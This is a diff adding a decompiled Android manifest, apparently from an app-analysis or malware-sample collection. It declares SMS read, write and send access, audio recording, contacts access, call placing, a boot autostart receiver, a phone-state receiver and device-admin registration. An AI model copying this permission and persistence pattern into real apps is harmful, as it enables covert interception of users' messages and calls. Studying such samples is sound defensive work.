@@ -1,0 +1,175 @@
+<?xml version="1.0" ?>
+<manifest android:versionCode="2" android:versionName="1.2" package="com.BioTechnology.iClientsService4" xmlns:android="http://schemas.android.com/apk/res/android">
+	
+
+	<uses-sdk android:minSdkVersion="10" android:targetSdkVersion="10">
+</uses-sdk>
+	
+
+	<uses-permission android:name="android.permission.READ_PHONE_STATE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.ACCESS_WIFI_STATE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.CHANGE_WIFI_STATE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.READ_PHONE_STATE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.CALL_PHONE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.CHANGE_NETWORK_STATE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.INTERNET">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.WRITE_SMS">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.READ_SMS">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.RECEIVE_SMS">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.SEND_SMS">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.READ_CONTACTS">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.RECORD_AUDIO">
+</uses-permission>
+	
+
+	<application android:allowBackup="true" android:icon="@7F050002" android:label="@7F050000" android:theme="@7F080007">
+		
+
+		<activity android:label="@7F050000" android:name="com.soft360.iService.MainActivity">
+			
+
+			<intent-filter>
+				
+
+				<action android:name="android.intent.action.MAIN">
+</action>
+				
+
+				<category android:name="android.intent.category.LAUNCHER">
+</category>
+				
+
+			</intent-filter>
+			
+
+		</activity>
+		
+
+		<service android:enabled="true" android:exported="false" android:name="com.soft360.iService.AService">
+</service>
+		
+
+		<service android:enabled="true" android:exported="false" android:name="com.soft360.iService.webService">
+</service>
+		
+
+		<receiver android:enabled="true" android:exported="false" android:name="com.soft360.iService.Alarm">
+</receiver>
+		
+
+		<receiver android:enabled="true" android:exported="false" android:name="com.soft360.iService.AutoStart">
+			
+
+			<intent-filter>
+				
+
+				<action android:name="android.intent.action.BOOT_COMPLETED">
+</action>
+				
+
+			</intent-filter>
+			
+
+		</receiver>
+		
+
+		<activity android:name="com.BioTechnology.iClientsService.IncomingCallActivity" android:theme="@android:0103000F">
+</activity>
+		
+
+		<receiver android:name="com.soft360.Receiver.MyPhoneReceiver">
+			
+
+			<intent-filter>
+				
+
+				<action android:name="android.intent.action.PHONE_STATE">
+</action>
+				
+
+			</intent-filter>
+			
+
+		</receiver>
+		
+
+		<receiver android:name="com.soft360.web.MyAdmin" android:permission="android.permission.BIND_DEVICE_ADMIN">
+			
+
+			<intent-filter>
+				
+
+				<action android:name="android.app.action.DEVICE_ADMIN_ENABLED">
+</action>
+				
+
+			</intent-filter>
+			
+
+			<meta-data android:name="android.app.device_admin" android:resource="@7F030009">
+</meta-data>
+			
+
+		</receiver>
+		
+
+	</application>
+	
+
+</manifest>
